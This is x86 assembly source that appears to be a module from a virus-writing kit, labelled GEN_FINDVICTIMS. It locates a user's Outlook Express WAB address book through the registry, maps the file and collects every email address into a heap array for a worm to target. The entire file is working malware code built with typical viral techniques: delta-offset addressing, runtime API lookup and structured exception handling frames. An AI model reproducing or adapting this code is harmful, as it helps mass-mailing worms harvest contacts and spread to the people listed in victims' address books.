;Descr:	This gen retrieves email addresses from user's MS Outlook
;	Express WAB addressbook in a default process heap
;
;Type:	GEN_FINDVICTIMS
;
;INPUT:
;	NONE
;
;OUTPUT:
;	DWORD	address of the list of email addresses (in the heap)
;		NULL if error
;

get_email_addresses_from_wab	Proc
	pushad
	@SEH_SetupFrame	<jmp	wab_seh>
	call	wab_delta
wab_delta:
	pop	ebp				;get delta offset

	xor	eax,eax				;initialize variables
	and	[ebp + wab_alloc - wab_delta],eax
	and	[ebp + wab_mem_offset - wab_delta],eax
	and	[ebp + wab_memory - wab_delta],eax

	@pushsz	'SHLWAPI'
	call	esi				;get address of SHLWAPI.DLL
	test	eax,eax
	je	wab_seh
	@pushsz	'SHGetValueA'
	push	eax
	call	edi				;get address of SHGetValueA API
	test	eax,eax
	je	wab_seh

	call	@pword
	dd	MAX_PATH
@pword:	call	wab_buffer
	dw	MAX_PATH dup (?)
wab_buffer:
	call	w_type
	dd	1
w_type:	push	0
	@pushsz	'Software\Microsoft\WAB\WAB4\Wab File Name'
	push	80000001h
	call	eax				;retrieve fullname of user's address
	test	eax,eax				;book file (*.WAB)
	jne	wab_seh

	@pushsz	'KERNEL32'
	call	esi				;get addresses of KERNEL32.DLL APIz
	xchg	eax,ebx				;...
	@pushsz	'CreateFileA'
	push	ebx
	call	edi
	mov	[ebp + wab_CreateFileA - wab_delta],eax

	@pushsz	'CreateFileMappingA'
	push	ebx
	call	edi
	mov	[ebp + wab_CreateFileMappingA - wab_delta],eax

	@pushsz	'MapViewOfFile'
	push	ebx
	call	edi
	mov	[ebp + wab_MapViewOfFile - wab_delta],eax

	@pushsz	'UnmapViewOfFile'
	push	ebx
	call	edi
	mov	[ebp + wab_UnmapViewOfFile - wab_delta],eax

	@pushsz	'CloseHandle'
	push	ebx
	call	edi
	mov	[ebp + wab_CloseHandle - wab_delta],eax

	@pushsz	'HeapAlloc'
	push	ebx
	call	edi
	mov	[ebp + wab_HeapAlloc - wab_delta],eax

	@pushsz	'HeapReAlloc'
	push	ebx
	call	edi
	mov	[ebp + wab_HeapReAlloc - wab_delta],eax

	@pushsz	'GetProcessHeap'
	push	ebx
	call	edi

	call	eax				;get default process heap
	test	eax,eax
	je	wab_seh
	mov	[ebp + wab_hHeap - wab_delta],eax

	push	1000h
	push	0
	push	eax
	mov	eax,12345678h
wab_HeapAlloc = dword ptr $-4
	call	eax				;allocate there one page (4kb)
	mov	[ebp + wab_memory - wab_delta],eax
	test	eax,eax
	je	wab_seh

	push	0
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	0
	push	FILE_SHARE_READ
	push	GENERIC_READ
	lea	eax,[ebp + wab_buffer-2*MAX_PATH - wab_delta]
	push	eax
	mov	eax,12345678h
wab_CreateFileA = dword ptr $-4
	call	eax				;open WAB file
	inc	eax
	je	wab_seh
	dec	eax
	mov	[ebp + wab_hFile - wab_delta],eax

	cdq
	push	edx
	push	edx
	push	edx
	push	PAGE_READONLY
	push	edx
	push	eax
	mov	eax,12345678h
wab_CreateFileMappingA = dword ptr $-4
	call	eax
	test	eax,eax
	je	wab_closefile
	mov	[ebp + wab_hMapFile - wab_delta],eax

	cdq
	push	edx
	push	edx
	push	edx
	push	FILE_MAP_READ
	push	eax
	mov	eax,12345678h
wab_MapViewOfFile = dword ptr $-4
	call	eax				;map it
	test	eax,eax
	je	wab_closefilemap
	xchg	eax,ebx

	pushad
	@SEH_SetupFrame	<jmp	seh_wab>	;set SEH frame

	mov	esi,[ebx+60h]
	add	esi,ebx				;get ptr to email addresses
	mov	ecx,[ebx+64h]			;get count of them

	call	w_em_addr
	db	50h dup (?)			;store address here
w_em_addr:
	pop	edi
wab_parse:
	pushad
	xor	ecx,ecx
l_wab:	inc	ecx
	lodsw					;get unicode character
	stosb					;save ANSI character
	test	al,al
	jne	l_wab				;size of email address in ECX

	;dynamicaly allocate memory for addresses and create array of them in there

	add	[ebp + wab_mem_offset - wab_delta],ecx
	mov	ebx,ecx
	mov	eax,12345678h
wab_mem_offset = dword ptr $-4
	cmp	eax,1000h
	jb	wab_alloc_continue		;no need to allocate next page

	mov	eax,2000h
	add	eax,12345678h
wab_alloc = dword ptr $-4
	push	eax
	push	dword ptr [ebp + wab_memory - wab_delta]
	push	0
	push	12345678h
wab_hHeap = dword ptr $-4
	mov	eax,12345678h
wab_HeapReAlloc = dword ptr $-4
	call	eax				;add new 4kb page
	test	eax,eax
	je	end_wab
	mov	[ebp + wab_memory - wab_delta],eax
	mov	ecx,1000h
	add	[ebp + wab_alloc - wab_delta],ecx
	sub	[ebp + wab_mem_offset - wab_delta],ecx
						;correct variables
wab_alloc_continue:
	lea	esi,[ebp + w_em_addr-50h - wab_delta]
	mov	edi,[ebp + wab_memory - wab_delta]
	add	edi,[ebp + wab_alloc - wab_delta]
	add	edi,[ebp + wab_mem_offset - wab_delta]
	sub	edi,ebx
	@copysz					;copy email address to an array
end_wab:popad
	add	esi,44h				;get to next record
	dec	ecx
	jne	wab_parse			;loooooooooooooop....

seh_wab:@SEH_RemoveFrame			;remove SEH frame
	popad

wab_unmapfile:
	push	ebx
	mov	eax,12345678h
wab_UnmapViewOfFile = dword ptr $-4
	call	eax				;unmap WAB file
wab_closefilemap:
	push	12345678h
wab_hMapFile = dword ptr $-4
	call	[ebp + wab_CloseHandle - wab_delta]
wab_closefile:
	push	12345678h
wab_hFile = dword ptr $-4
	mov	eax,12345678h
wab_CloseHandle = dword ptr $-4
	call	eax				;close it

wab_seh:@SEH_RemoveFrame
	popad
	mov	eax,12345678h
wab_memory = dword ptr $-4			;return ptr to array of addresses in EAX
	ret

end_get_email_addresses_from_wab:
get_email_addresses_from_wab	EndP